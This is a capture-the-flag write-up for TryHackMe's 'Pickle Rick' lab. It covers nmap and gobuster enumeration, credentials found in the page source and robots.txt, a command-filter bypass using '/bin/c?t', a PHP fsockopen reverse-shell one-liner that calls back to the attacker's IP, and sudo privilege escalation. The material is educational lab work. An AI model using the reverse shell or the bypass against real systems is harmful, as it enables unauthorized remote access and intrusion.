# Writeup Pickle Rick challenge (THM)

![logo_machine](https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg)

The following challenge is hosted by TryHackMe and aims at exploiting a web server in order to find three ingredients in order to help Rick, who wants to create a potion.
Let's begin.

## Target enumeration

As usual, we start analyzing the target by launching *nmap* command:
```
nmap -sV -A -T4 10.10.38.165 -oN nmap.txt
```
As a result we obtain that ports 22 (ssh) and 80 (http) are open.

Let's examine the website.

## Website

Inspecting the source code, we immediately find this comment:

*Note to self, remember username! Username: R1ckRul3s*

So, we jot down the username *R1ckRul3s*.

In the */robots.txt* page we find a mysterious string, i.e.: *Wubbalubbadubdub*.

If we try to connect to port 22 (ssh) using as username R1ckRul3s and as password Wubbalubbadubdub doesn't work (permission denied), so we need to discover where these credentials can be used.
So, we launch *gobuster* in order to discover other potential paths, we the following command (note the *x* option, where we look for files with php extension, too):

```
gobuster -w <path/to/wordlist/>directory-list-2.3-small.txt -u http://<target_ip>/ -t 20 -x php
```

As a result we obtain these paths:

* /login.php (Status: 200)
* /assets (Status: 301)
* /portal.php (Status: 302)


Yep! We found the place to insert the above-mentioned credentials: *login.php*.

![img3](/images/pickle_rick-thm/img3.png?raw=true)


## First ingredient

Once logged in, we land in a web page with a menu with some options on the top. The most interesting tab is *Commands*. Indeed, here we can find an input form, where we can run shell commands.

For example, if we type the ```ls``` command, we can get the following results:
* **Sup3rS3cretPickl3Ingred.txt**
* assets
* clue.txt
* denied.php
* index.html
* login.php
* portal.php
* robots.txt

Immediately, we notice the Sup3rS3cretPickl3Ingred.txt file. However, if we try to cat it, a filter is placed:

![img4](/images/pickle_rick-thm/img4.png?raw=true)


In order to bypass it, we used metacharacters for pattern matching ([link](https://www.linux.com/topic/desktop/introduction-regular-expressions-new-linux-users/)). For example, with this command we can retrieve the data in the file:

```
/bin/c?t Sup3rS3cretPickl3Ingred.txt
```

![img5](/images/pickle_rick-thm/img5.png?raw=true):

Great! First flag found.


## Second ingredient

In order to understand where we can find the second flag, let's read the clue we have just found using ```/bin/c?t clue.txt```; it states:

*Look around the file system for the other ingredient.*

So, we just need to look over the file system to get the next flag.

Then, if we enter in **/home/rick**, there is a file named *second ingredients* (```ls -l /home/rick```).

Let's cat it: 

```/bin/c?t "/home/rick/second ingredients"``` 

(get a look to this writeup I wrote for more regarding files with spaces in their name ;) [link](https://francevarotz98.github.io/2022/10/08/otw-bandit-writeup.html#level-2--3))


## Third ingredient

For the third, and last, ingredient I decided to create a reverse shell (even if it is not needed). In order to do so, in a terminal start listening to a port (e.g., port 7777); then, in the command panel insert the following command:

```
php -r '$sock=fsockopen("<YOUR_IP_address>",7777);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

and pressthee *execute* button.

![img6](/images/pickle_rick-thm/img6.png?raw=true)

Nice !! We have a rev shell!

Now, note that file 3rd.txt can only be read by root user.

Therefore, run ```sudo -l``` (see here [link](https://www.explainshell.com/explain?cmd=sudo+-l) for more about the *l* option in sudo command)
and this is what we are going to obtain:

```
$ sudo -l
<snip>
User www-data may run the following commands <snip>:
    (ALL) NOPASSWD: ALL
```

so: we can run all the commands as sudo in the whole file system !!!

Then:

![img7](/images/pickle_rick-thm/img7.png?raw=true)

3rd ingredient found ;)
